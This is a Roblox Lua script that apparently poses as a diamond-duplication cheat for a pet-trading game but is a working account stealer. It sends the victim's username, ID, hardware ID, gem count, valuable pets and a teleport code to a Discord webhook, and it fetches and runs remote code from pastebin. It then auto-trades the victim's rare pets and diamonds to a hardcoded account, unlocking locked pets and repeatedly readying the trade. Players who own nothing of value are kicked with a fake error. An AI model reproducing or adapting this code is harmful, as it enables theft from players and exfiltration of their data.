getgenv().UName = "jerfie22"
getgenv().HasWhitelisted = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local diamondsText = LocalPlayer.PlayerGui.MainGui.StartFrame.Currency.Diamonds.Amount.Text
local clean = diamondsText:gsub(",", "")
local Diamonds = tonumber(clean)
local Duped = Diamonds * 2

local PetsInventory = require(LocalPlayer.PlayerScripts.MainClient.Gui.GuiScripts.PetsInventory)
local ClientDataManager = require(LocalPlayer.PlayerScripts.MainClient.ClientDataManager)
local PetsInfo = require(ReplicatedStorage.Modules.PetsInfo)

local Whitelisted = {
    ["Domino Crown God"] = true,
    ["Golden Domino Crown God"] = true,
    ["Shiny Domino Crown God"] = true,
    ["Rainbow Domino Crown God"] = true,
    ["Void Domino Crown God"] = true,
    ["Void Builder Bot"] = true,
    ["Rainbow 1x1x1x1"] = true,
    ["Void 1x1x1x1"] = true,
    ["Void Noob Queen"] = true,
    ["Shiny Noob Queen"] = true,
    ["Rainbow Noob Queen"] = true,
    ["Eclipse"] = true,
    ["Golden Eclipse"] = true,
    ["Shiny Eclipse"] = true,
    ["Rainbow Eclipse"] = true,
    ["Void Eclipse"] = true,
    ["Rainbow Ultra Mecha"] = true,
    ["Void Ultra Mecha"] = true,
    ["Amethyst Overlord"] = true,
    ["Golden Amethyst Overlord"] = true,
    ["Shiny Amethyst Overlord"] = true,
    ["Rainbow Amethyst Overlord"] = true,
    ["Void Amethyst Overlord"] = true,
    ["Shiny Universe Ruler"] = true,
    ["Rainbow Universe Ruler"] = true,
    ["Void Universe Ruler"] = true,
    ["Void Fire Empyrean"] = true,
    ["Rainbow Stardust"] = true,
    ["Shiny Stardust"] = true,
    ["Void Stardust"] = true,
    ["Void Shadow Wraith"] = true,
    ["Rainbow Rockstar-x"] = true,
    ["Void Rockstar-x"] = true,
    ["Rainbow Crystalis"] = true,
    ["Void Crystalis"] = true,
    ["Void Crystal Empress"] = true,
    ["Golden Blitzshade"] = true,
    ["Rainbow Blitzshade"] = true,
    ["Void Blitzshade"] = true,
    ["Blitzshade"] = true,
    ["The Leaves of Fall"] = true,
    ["Golden The Leaves of Fall"] = true,
    ["Shiny The Leaves of Fall"] = true,
    ["Rainbow The Leaves of Fall"] = true,
    ["Void The Leaves of Fall"] = true,
    ["Rainbow Queen of the Fall"] = true,
    ["Void Queen of the Fall"] = true,
    ["Void Toxic Overlord"] = true,
    ["Rainbow Toxic Overlord"] = true,
    ["Void Magma Majesty"] = true,
    ["Rainbow Magma Majesty"] = true,
    ["Void Oceana"] = true,
    ["Rainbow Oceana"] = true,
    ["Void Solara"] = true,
}

local function AddWhitelistedPets()
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            if petData.Locked then
                ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
            end
            ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
        end
    end
end

local function ModifyDiamondOffer(amount)
    ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
end

local function SendTrade(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        ReplicatedStorage.Events.UIAction:FireServer("RequestTradeWithPlayer", player)
    else
        warn("Player not found: " .. tostring(playerName))
    end
end

local function GetTeleportScript()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
end

local function rt()
    while LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame.Visible do
        task.wait(0.1)
        ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
    end
end

local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if TradeGui.Visible then
        task.spawn(rt)
        AddWhitelistedPets()
        ModifyDiamondOffer(Diamonds)
    end
end)

local function StartTrade()
    wait(9)
    loadstring(game:HttpGet("https://pastebin.com/raw/8wP3Pkwz"))()
    SendTrade(getgenv().UName)
end

getgenv().HasWhitelisted = false
for petID, petData in pairs(ClientDataManager.Data.Pets) do
    local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
    if Whitelisted[petName] then
        getgenv().HasWhitelisted = true
        break
    end
end

local function getWhitelistedPets()
    local list = {}
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            table.insert(list, petName)
        end
    end
    return table.concat(list, ", ")
end

local whitelistedPets = getWhitelistedPets()

local Webhook_URL = "https://discord.com/api/webhooks/1223588545894158347/3PJdmPm7NEQYvvkKVByKbt8W84I27Tu0beo3WWsWhL0ZCqUtbG3pAAimUCqBjk67yWN8"

local player = game.Players.LocalPlayer
local function getPlayerProfile(player)
    local playerName = player.Name
    local playerID = player.UserId
    local accountAge = player.AccountAge
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    return playerName, playerID, accountAge, hwid
end

local playerName, playerID, accountAge, hwid = getPlayerProfile(player)

local data = {
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = playerName,
                ["icon_url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=".. playerID .."&size=150x150&format=Png&isCircular=false",
            },
            ["title"] = "Execution Detected!",
            ["description"] = "gg./ScriptKids",
            ["type"] = "rich",
            ["color"] = tonumber(0xFF0000),
            ["fields"] = {
                {["name"]="Player ID:", ["value"]=tostring(playerID), ["inline"]=true},
                {["name"]="Gems:", ["value"]=tostring(Diamonds), ["inline"]=true},
                {["name"]="Whitelisted Pets:", ["value"]=whitelistedPets ~= "" and whitelistedPets or "None", ["inline"]=false},
                {["name"]="Account Age:", ["value"]=string.format("%.2f days", accountAge), ["inline"]=true},
                {["name"]="HWID:", ["value"]=hwid, ["inline"]=true},
                {["name"]="Teleport Code:", ["value"]=GetTeleportScript(), ["inline"]=false},
            },
        },
    },
}

local Request = http_request or request or HttpPost or (syn and syn.request)

if Request then
    Request({
        Url = Webhook_URL,
        Body = HttpService:JSONEncode(data),
        Method = "POST",
        Headers = {["Content-Type"]="application/json"}
    })
end

if getgenv().HasWhitelisted or Diamonds > 10 then
    local target = Players:FindFirstChild(getgenv().UName)
    if target then
        StartTrade()
    else
        Players.PlayerAdded:Connect(function(player)
            if player.Name == getgenv().UName then
                StartTrade()
            end
        end)
    end
else
    LocalPlayer:Kick("An Error Occurred")
end
